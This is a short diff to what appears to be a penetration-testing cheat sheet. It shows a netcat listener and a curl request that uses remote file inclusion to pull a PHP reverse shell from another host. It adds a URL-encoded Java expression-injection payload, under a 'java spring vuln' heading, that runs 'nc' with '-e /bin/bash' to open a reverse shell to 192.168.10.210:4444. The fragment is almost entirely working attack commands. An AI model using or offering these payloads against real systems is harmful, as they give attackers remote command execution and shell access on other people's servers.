@@ -30,3 +30,8 @@ start the web server hosting our script
     $ nc -nlvp 443
 
     $ curl "http://vulnapp.com/home/index.php?page=http://192.168.1.1/php-reverse-shell.php" 
+
+#### java spring vuln
+
+    http://booger.com:8080/search?query=$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27busybox%20nc%20192.168.10.210%204444%20-e%20/bin/bash%27)%7D
+
